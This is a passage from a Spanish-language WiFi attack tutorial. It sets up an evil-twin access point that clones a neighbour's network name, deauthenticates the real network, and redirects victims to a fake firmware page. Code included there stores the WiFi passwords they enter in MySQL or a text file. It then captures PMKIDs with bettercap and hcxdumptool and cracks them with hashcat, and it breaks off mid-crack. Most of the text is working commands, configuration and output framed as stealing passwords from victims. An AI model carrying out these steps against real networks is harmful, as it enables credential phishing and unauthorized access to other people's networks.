    2 0.019968349 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
```

Lo que haremos en los siguientes puntos, es justamente aprovechar estos paquetes para asociar a nuestros
clientes a un AP falso gestionado por nosotros, desde donde a través de reglas de enrutamiento y
redireccionamientos haremos que estos sean redirigidoa a una página falsa la cual solicitará la contraseña de
la red WiFi.

La idea es que una vez los clientes víctima introduzcan las credenciales, estas viajen en texto claro hacia
nosotros, pudiendo visualizarlas para posteriormente llevar a cabo la autenticación contra la red inalámbrica
ajena.

Cabe decir que el paso de solicitar la contraseña de la red inalámbrica es opcional, de la misma manera
podríamos solicitar algún otro tipo de dato.

#### Creación de fichero DHCP

Comenzaremos creando un simple fichero DHCP con nombre **dhcpd.conf** bajo la ruta **/etc/**:

```bash
┌─[root@parrot]─[/etc]
└──╼ #pwd
/etc
┌─[root@parrot]─[/etc]
└──╼ #cat dhcpd.conf 
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.128 netmask 255.255.255.128 {
option subnet-mask 255.255.255.128;
option broadcast-address 192.168.1.255;
option routers 192.168.1.129;
option domain-name-servers 8.8.8.8;
range 192.168.1.130 192.168.1.140;
}
```

En este fichero, indicamos que el promedio de vida mínimo será de 600 segundos y el máximos de 7200. Entre
este rango, una vez pasado el tiempo estimado se asignará una nueva IP al cliente asociado a nuestro
AP (simplemente por hacerla dinámica).

Para evitar entrar en conflicto con la topología de mi red real, como la pasarela es la 192.168.1.1 y algunos de los equipos están configurados en el rango del 192.168.1.2 al 192.168.1.100, lo que he hecho ha sido asignar un nuevo segmento, comprendido entre el rango 192.168.1.130 hasta el 192.168.1.140. Asignaremos como máscara de red la 255.255.255.128 y como nueva pasarela la 192.168.1.129. Todo esta configuración será gestionada por una nueva interfaz que crearemos en breve.

#### Configuración de página web

Nos descargaremos la siguiente plantilla para hacer nuestro ataque: 

* http://ge.tt/9EyXb5w2

#### Inicialización de servicios

Iniciamos los servicios **mysql** y **apache2**:

```bash
┌─[root@parrot]─[/etc]
└──╼ #service apache2 start &amp;&amp; service mysql start
┌─[root@parrot]─[/etc]
└──╼ #echo $?
0
```

Posteriormente comprobamos que nuestro servidor web funciona correctamente:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WbYt.png&quot;&gt;

Todo este diseño es personalizable y se puede retocar sin ningún tipo de problema desde el HTML. En mi caso,
lo voy a dejar así.

#### Creación de base de datos via MYSQL

Ahora bien, si nos fijamos en el **ACTION** del HTML principal, nos encontramos con esto:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #cat index.html | grep action
            &lt;tr&gt;&lt;td&gt;&lt;form action=&quot;dbconnect.php&quot; method=&quot;post&quot;&gt;
┌─[root@parrot]─[/var/www/html]
└──╼ #cat dbconnect.php 
&lt;?php
session_start();
ob_start();
$host=&quot;localhost&quot;;
$username=&quot;fakeap&quot;;
$pass=&quot;fakeap&quot;;
$dbname=&quot;rogue_AP&quot;;
$tbl_name=&quot;wpa_keys&quot;;

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if (!$conn) {
    die(&quot;Connection failed: &quot; . mysqli_connect_error());
}


$password1=$_POST['password1'];
$password2=$_POST['password2'];

$sql = &quot;INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')&quot;;
if (mysqli_query($conn, $sql)) {
    echo &quot;New record created successfully&quot;;
} else {
    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn);
}

mysqli_close($conn);

sleep(2);
header(&quot;location:upgrading.html&quot;);
ob_end_flush();
?&gt;
```

El **action** viene definido por el fichero **dbconnect.php**, el cual si nos fijamos, lleva a cabo una
autenticación a través del servicio **MYSQL** a una tabla y base de datos que no existen. Por tanto, hay que
crearla.

Crear la base de datos en este caso es bastante sencillo:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #mysql -uroot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.1.37-MariaDB-3 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; create database rogue_AP;
Query OK, 1 row affected (0.00 sec)

MariaDB [(none)]&gt; use rogue_AP;
Database changed
MariaDB [rogue_AP]&gt; create table wpa_keys(password1 varchar(32), password2 varchar(32));
Query OK, 0 rows affected (0.40 sec)

MariaDB [rogue_AP]&gt; show tables
    -&gt; ;
+--------------------+
| Tables_in_rogue_AP |
+--------------------+
| wpa_keys           |
+--------------------+
1 row in set (0.00 sec)

MariaDB [rogue_AP]&gt; describe wpa_keys;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| password1 | varchar(32) | YES  |     | NULL    |       |
| password2 | varchar(32) | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.00 sec)

MariaDB [rogue_AP]&gt; 
```

Una vez creada, ya podemos insertar valores en ella:

```bash
MariaDB [rogue_AP]&gt; insert into wpa_keys(password1, password2) values (&quot;test&quot;, &quot;test&quot;);
Query OK, 1 row affected (0.12 sec)

MariaDB [rogue_AP]&gt; select *from wpa_keys;
+-----------+-----------+
| password1 | password2 |
+-----------+-----------+
| test      | test      |
+-----------+-----------+
1 row in set (0.00 sec)

MariaDB [rogue_AP]&gt; 
```

Si probamos a introducir las credenciales desde la página web, vemos que nos encontramos con el siguiente error:

`Connection failed: Access denied for user 'fakeap'@'localhost'`

Lo cual es normal, pues está intentando autenticar contra la base de datos haciendo uso del usuario
**fakeap**, el cual no está creado. Por tanto, lo creamos y asignamos máximos privilegios sobre la base de datos creada:

```bash
MariaDB [rogue_AP]&gt; create user fakeap@localhost identified by 'fakeap';
Query OK, 0 rows affected (0.00 sec)

MariaDB [rogue_AP]&gt; grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
Query OK, 0 rows affected (0.00 sec)
```

Y ahora ya tras introducir las credenciales desde la web, veremos que estas son añadidasq a nuestra base de
datos:

```bash
MariaDB [rogue_AP]&gt; select *from wpa_keys;
+------------------+------------------+
| password1        | password2        |
+------------------+------------------+
| test             | test             |
| pruebadesdelaweb | pruebadesdelaweb |
+------------------+------------------+
2 rows in set (0.00 sec)

MariaDB [rogue_AP]&gt; 
```

#### Creación de falso punto de acceso via Airbase

Comenzamos a montar nuestro Fake AP. Para ello, a través de la utilidad **airbase**, generaremos un falso
punto de acceso en el canal especificado.

La idea en este punto, es analizar el entorno y listar los puntos de acceso disponibles. Aquel cuya contraseña
queramos averiguar, será el que clonaremos, generando un nuevo punto de acceso **OPN** con el mismo ESSID.

Supongamos que la red cuya contraseña quiero averiguar es **MOVISTAR_1677**, perfecto pues entonces hacemos lo
siguiente:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #airbase-ng -e MOVISTAR_1677 -c 7 -P wlan0mon
22:13:39  Created tap interface at0
22:13:39  Trying to set MTU on at0 to 1500
22:13:39  Access Point with BSSID E4:70:B8:D3:93:5C started.
```

Con esto, hemos conseguido crear un punto de acceso con nombre **MOVISTAR_1677** en el canal 7, sin
autenticación.

#### Creación de interfaz y asignación de segmentos

Ya con el punto de acceso creado, comenzamos creando una nueva interfaz **at0**, la cual en cuanto a
propiedades debe ser equivalente al fichero **dhcpd.conf** previamente creado:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #ifconfig at0 192.168.1.129 netmask 255.255.255.128
┌─[root@parrot]─[/home/s4vitar]
└──╼ #route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
┌─[root@parrot]─[/home/s4vitar]
└──╼ #echo 1 &gt; /proc/sys/net/ipv4/ip_forward
┌─[root@parrot]─[/home/s4vitar]
└──╼ #ifconfig
at0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether e4:70:b8:d3:93:5c  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57  bytes 8828 (8.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.43  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::c114:795c:5d1f:78a7  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 80:ce:62:3c:eb:a1  txqueuelen 1000  (Ethernet)
        RX packets 6777682  bytes 8286953540 (7.7 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3292154  bytes 880484597 (839.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 772442  bytes 1353509541 (1.2 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 772442  bytes 1353509541 (1.2 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=867&lt;UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI&gt;  mtu 1800
        unspec E4-70-B8-D3-93-5C-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 1179679  bytes 610643779 (582.3 MiB)
        RX errors 0  dropped 1078475  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

┌─[root@parrot]─[/home/s4vitar]
└──╼ #
```

Os recuerdo que el tercer comando aplicado es necesario para este caso, igual que cuando hacíamos
envenenamiento ARP, pues para este caso necesitamos contar con el enrutamiento habilitado en nuestro equipo.

#### Control y creación de reglas de enrutamiento por iptables

A continuación, limpiamos cualquier tipo de regla que tengamos previamente definida de **iptables** y generamos nuestras nuevas reglas:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables --flush
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables --table nat --flush
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables --delete-chain
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables --table nat --delete-chain
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables --append FORWARD --in-interface at0 -j ACCEPT
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables -t nat -A POSTROUTING -j MASQUERADE
┌─[root@parrot]─[/home/s4vitar]
└──╼ #
```

La idea es nutrir nuestra interfaz **at0** de la conexión padre **eth0**, de esta forma, los usuarios que se
conecten a nuestro AP podrán navegar por internet sin mayor inconveniente (en otras palabras, crear un túnel
de conexión).

Asimismo, cualquier tráfico **HTTP** que detectemos por parte de nuestras víctimas, será redireccionado a
nuestra página web fraudulenta, con el objetivo de hacerles creer que realmente el router necesita de una
configuración de Firmware y por ello solicita las credenciales de acceso a la red.

#### Sincronización de reglas definidas con el Fake AP

Ya por último, lo que nos queda es sincronizar todas nuestras reglas definidas con el Fake AP, para que cobre
vida y comience a operar bajo nuestras reglas:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
Internet Systems Consortium DHCP Server 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
Config file: /etc/dhcpd.conf
Database file: /var/lib/dhcp/dhcpd.leases
PID file: /var/run/dhcpd.pid
Wrote 2 leases to leases file.
Listening on LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
Sending on   LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
Sending on   Socket/fallback/fallback-net
```

Si obtenemos un output como el anterior, es que todo se ha realizado correctamente. Una vez llegados a este
punto, lo que procedemos desde otra consola es a aplicar un ataque de deautenticación global
(FF:FF:FF:FF:FF:FF) contra toda la red.

Tras los clientes lanzar paquetes **Probe Request** en busca del AP, como el legítimo queda anulado debido a
los paquetes que estamos de manera continua enviando, los dispositivos se confundirán y harán que estos se
conecten a nuestro Fake AP, ¿por qué sin autenticarse?, porque nuestro Fake AP es de protocolo **OPN** :)

Esto del lado de la víctima es casi inperceptible, pues la migración de una red a otra para algunos
dispositivos es casi inmediata. Ya dependiendo de la imaginación, originalidad e ingenio de cada uno, se podrá
obtener lo deseado una vez la víctima se mueve por nuestros terrenos.

#### Robo de datos

Como es de esperar, una vez la víctima navegue por una página HTTP, será redireccionada a nuestro portal web
falso. A nivel de dirección URL, figurará el dominio al cual ha accedido, es decir, no figurará nuestra
dirección IP.

Una vez esta introduce sus credenciales, estas serán enviadas a nuestra base de datos y a través del servicio
**MYSQL** de forma interactiva las podremos visualizar sin mayor problema.

Otra forma más cómoda en caso de no haber querido tirar de **MYSQL**, podría haber sido para el **ACTION** del
HTML principal, haber definido un nuevo archivo **post.php** con una estructura semejante como esta:

```php
&lt;?php $file = 'wifi-password.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://192.168.1.1&quot; /&gt;
```

De manera que tras introducir las credenciales de acceso, estas son depositadas en nuestro equipo en la ruta
**/var/www/html**, en el fichero **wifi-password.txt**. De igual manera, en caso de introducir múltiples
contraseñas por parte de varios clientes, estas se van apilando, pudiendo ver todo el histórico de contraseñas
introducidas.

### Ataque a redes sin clientes

Hasta ahora, hemos visto todas las técnicas necesarias para averiguar la contraseña de una red Wifi que
funcione por protocolo WPA/WPA2 y autenticación PSK, pero siempre con la condición de que esta debe de poseer clientes.

¿Qué pasa si la red no cuenta con clientes?, ¿se puede averiguar la contraseña?, la respuesta es sí, y no...
no es con un ataque de falsa autenticación.

#### Clientless PKMID Attack

Esta nueva metodología nos permitirá romper la seguridad de WPA y WPA2 mediante el denominado Pairwise Master
Key Identifier o PMKID, una característica roaming habilitada en muchos dispositivos.

La principal diferencia con ataques existentes es que en este ataque, la captura de un EAPOL o saludo de
4-vías no es necesaria, como en casos anteriores. El nuevo ataque es realizado con el RSN IE (Robust Network
Information Element) de una simple trama EAPOL, lo cual es flipante y maravilloso.

##### Ataque desde Bettercap

Aunque no lo hago así, os lo explico también. Imaginemos que queremos capturar los Hashes de múltiples redes
inalámbricas de nuestro entorno. Olvidémonos ya de los Handshakes, y de ataques de de-autenticación y todas
estas técnicas que habíamos visto previamente.

Lo primero como siempre es ponerse en modo monitor, y desde **Bettercap** efectuar el siguiente procedimiento:

```bash
┌─[root@parrot]─[/opt/bettercap]
└──╼ #./bettercap -iface wlan0mon
bettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]

 wlan0mon  » wifi.recon on
[22:38:15] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)
[22:38:16] [sys.log] [inf] wifi started (min rssi: -200 dBm)
 wlan0mon  » [22:38:16] [sys.log] [inf] wifi channel hopper started.
 wlan0mon  » [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_2A51 (-94 dBm) detected as 78:29:ed:a9:2a:52 (Askey Computer Corp).
 wlan0mon  » [22:38:16] [wifi.ap.new] wifi access point MOVISTAR_A908 (-83 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).
 wlan0mon  » [22:38:18] [wifi.ap.new] wifi access point MOVISTAR_1677 (-55 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).
 wlan0mon  » [22:38:19] [wifi.ap.new] wifi access point MIWIFI_psGP (-95 dBm) detected as 50:78:b3:ee:bb:ac.
 wlan0mon  » [22:38:19] [wifi.client.new] new station 20:34:fb:b1:c5:53 detected for MOVISTAR_1677 (1c:b0:44:d4:16:78)
 wlan0mon  » w[22:38:20] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).
 wlan0mon  » wifi.[22:38:21] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-81 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).
 wlan0mon  » wifi.[22:38:21] [wifi.ap.new] wifi access point LowiF7D3 (-90 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).
 wlan0mon  » wifi.show[22:38:21] [wifi.ap.new] wifi access point vodafone4038 (-91 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).
 wlan0mon  » wifi.show[22:38:21] [wifi.ap.new] wifi access point MOVISTAR_3126 (-94 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).
 wlan0mon  » wifi.show

┌─────────┬───────────────────┬─────────────────────┬──────────────────┬──────────────────────┬────┬─────────┬───────┬───────┬──────────┐
│ RSSI ▴  │       BSSID       │        SSID         │    Encryption    │         WPS          │ Ch │ Clients │ Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼─────────────────────┼──────────────────┼──────────────────────┼────┼─────────┼───────┼───────┼──────────┤
│ -57 dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677       │ WPA2 (CCMP, PSK) │ 2.0                  │ 6  │ 1       │ 486 B │ 172 B │ 22:38:19 │
│ -83 dBm │ f8:8e:85:df:3e:13 │ Wlan1               │ WPA (TKIP, PSK)  │ 1.0                  │ 9  │         │       │       │ 22:38:20 │
│ -84 dBm │ fc:b4:e6:99:a9:09 │ MOVISTAR_A908       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1  │         │       │       │ 22:38:17 │
│ -85 dBm │ 30:d3:2d:58:3c:6b │ devolo-30d32d583c6b │ WPA2 (CCMP, PSK) │ 2.0                  │ 11 │         │       │       │ 22:38:22 │
│ -86 dBm │ 10:62:d0:f6:f7:d8 │ LowiF7D3            │ WPA2 (TKIP, PSK) │ 2.0                  │ 11 │         │       │       │ 22:38:22 │
│ -92 dBm │ 28:9e:fc:0c:40:3e │ vodafone4038        │ WPA2 (TKIP, PSK) │ 2.0                  │ 11 │         │       │       │ 22:38:21 │
│ -94 dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP         │ WPA2 (CCMP, PSK) │ 2.0                  │ 6  │         │       │       │ 22:38:19 │
│ -94 dBm │ 78:29:ed:a9:2a:52 │ MOVISTAR_2A51       │ WPA2 (CCMP, PSK) │ 2.0                  │ 1  │         │       │       │ 22:38:16 │
│ -94 dBm │ cc:d4:a1:0c:31:28 │ MOVISTAR_3126       │ WPA2 (CCMP, PSK) │ 2.0 (not configured) │ 11 │         │       │       │ 22:38:21 │
└─────────┴───────────────────┴─────────────────────┴──────────────────┴──────────────────────┴────┴─────────┴───────┴───────┴──────────┘

wlan0mon (ch. 13) / ↑ 0 B / ↓ 26 kB / 112 pkts

 wlan0mon  »  
```

Ya viendo que se nos listan todas las redes, corremos el siguiente comando:

```bash
 wlan0mon  » wifi.assoc all
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2A51 (channel:1 encryption:WPA2)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_A908 (channel:1 encryption:WPA2)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_2F95 (channel:1 encryption:WPA2)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MIWIFI_psGP (channel:6 encryption:WPA2)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:6 encryption:WPA2)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP Wlan1 (channel:9 encryption:WPA)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP vodafone4038 (channel:11 encryption:WPA2)
 wlan0mon  » [22:39:18] [sys.log] [inf] wifi sending association request to AP MOVISTAR_3126 (channel:11 encryption:WPA2)
 wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP LowiF7D3 (channel:11 encryption:WPA2)
 wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP devolo-30d32d583c6b (channel:11 encryption:WPA2)
 wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_1677 (channel:112 encryption:WPA2)
 wlan0mon  » [22:39:19] [sys.log] [inf] wifi sending association request to AP MOVISTAR_PLUS_1677 (channel:112 encryption:WPA2)
 wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » [22:39:23] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » [22:39:24] [wifi.client.handshake] captured e4:70:b8:d3:93:5c -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  »  
```

Sencillo, ¿verdad?, pues ya está, así de fácil. En el fichero **/root/bettercap-wifi-handshakes.pcap** ahora
lo único que tenemos que pasar es la herramienta **hcxpcaptool** para convertir a Hashes nuestras capturas y
listo.

Prefiero comentar esta parte con más detalle en los siguientes puntos.

##### Ataque via hcxdumptool

Esta es la forma en la que yo lo suelo hacer. Ejecutamos el siguiente comando para capturar todos los PKMID's
posibles:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #hcxdumptool -i wlan0mon -o Captura --enable_status=1
initialization...
warning: NetworkManager is running with pid 27706
warning: wpa_supplicant is running with pid 27684
warning: wlan0mon is probably a monitor interface

start capturing (stop with ctrl+c)
INTERFACE................: wlan0mon
ERRORMAX.................: 100 errors
FILTERLIST...............: 0 entries
MAC CLIENT...............: b0febdab6d9d
MAC ACCESS POINT.........: 24336c5495c9 (incremented on every new client)
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 62752
ANONCE...................: 5e37baf7d8026ae9a9b5dcd74239558a74149218819377f2d3d866aa4c6249ab

[22:42:02 - 001] fcb4e699a909 -&gt; b0febdab6d9d [FOUND PMKID CLIENT-LESS]
[22:42:08 - 006] 1cb044d41678 -&gt; b0febdab6d9d [FOUND PMKID CLIENT-LESS]
INFO: cha=11, rx=1314, rx(dropped)=602, tx=117, powned=2, err=0
```

Y como vemos, en cuestión de segundos tengo 2 redes vulnerables de las cuales he obtenido el PKMID. En este
punto, estaríamos igual que con **Bettercap**, es decir, tenemos la captura, ¿y ahora qué?, descubrámoslo en el siguiente punto.

##### Uso de hcxpcaptool

Ahora viene la parte interesante, hemos visto lo sencillo que ha sido obtener un PKMID de 2 redes distintas.
Pues ahora tan solo tenemos que aplicar el siguiente comando para visualizar el hash correspondiente a la contraseña de la red inalámbrica:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #hcxpcaptool -z myHashes Captura 

reading from Captura
                                                
summary:                                        
--------
file name........................: Captura
file type........................: pcapng 1.0
file hardware information........: x86_64
file os information..............: Linux 4.19.0-parrot1-13t-amd64
file application information.....: hcxdumptool 5.1.7
network type.....................: DLT_IEEE802_11_RADIO (127)
endianness.......................: little endian
read errors......................: flawless
packets inside...................: 30
skipped packets (damaged)........: 0
packets with GPS data............: 0
packets with FCS.................: 30
beacons (total)..................: 9
beacons (WPS info inside)........: 6
authentications (OPEN SYSTEM)....: 9
authentications (BROADCOM).......: 7
EAPOL packets (total)............: 12
EAPOL packets (WPA2).............: 12
PMKIDs (total)...................: 2
PMKIDs (WPA2)....................: 12
PMKIDs from access points........: 2
best PMKIDs......................: 2

2 PMKID(s) written to myHashes
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #cat myHashes 
0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
```

**ANOTACIÓN**: Para saber a qué redes pertenecen estos Hashes, tan sólo tenemos que visualizar el valor
comprendido entre el primer y segundo asterisco. Corresponden a las BSSID's de los AP's.

Y estos, ya pueden ser pasados por **hashcat** para someterlos a la fase de Cracking:

```bash
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU

OpenCL Platform #2: The pocl project
====================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger set to 90c

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=16800 -D _unroll'
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921538
* Keyspace..: 14344387

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (3 secs)
Time.Estimated...: Mon Aug 12 22:53:08 2019 (5 mins, 1 sec)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    93064 H/s (55.72ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 610384/28688774 (2.13%)
Rejected.........: 446544/610384 (73.16%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3712-3840
Candidates.#1....: 123456789 -&gt; sunflower15
Hardware.Mon.#1..: Temp: 64c Util: 99% Core:1670MHz Mem:3504MHz Bus:8

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (7 secs)
Time.Estimated...: Mon Aug 12 22:53:09 2019 (4 mins, 58 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    91919 H/s (55.94ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 1292574/28688774 (4.51%)
Rejected.........: 801054/1292574 (61.97%)
Restore.Point....: 387112/14344387 (2.70%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3840-3968
Candidates.#1....: sunflower11 -&gt; 22lovers
Hardware.Mon.#1..: Temp: 66c Util:100% Core:1657MHz Mem:3504MHz Bus:8

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; 
```

En mi caso, tiro de **GPU** y os puedo decir que el tiempo total para cracker estos hashes es de 5 minutos.
(Aunque también se puede ver en el output anterior).

Se podría decir que es una gozada, porque nos estamos olvidando tanto de **aircrack** como de **aireplay**, de
**airodump**, **pyrit**, **airolib**, **cowpatty**, **genpmk**, etc.

Una vez crackeada la contraseña, esta es mostrada:

```bash
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 (1 min, 51 secs)
Time.Estimated...: Mon Aug 12 22:52:25 2019 (2 mins, 30 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    89458 H/s (57.26ms) @ Accel:512 Loops:128 Thr:64 Vec:1
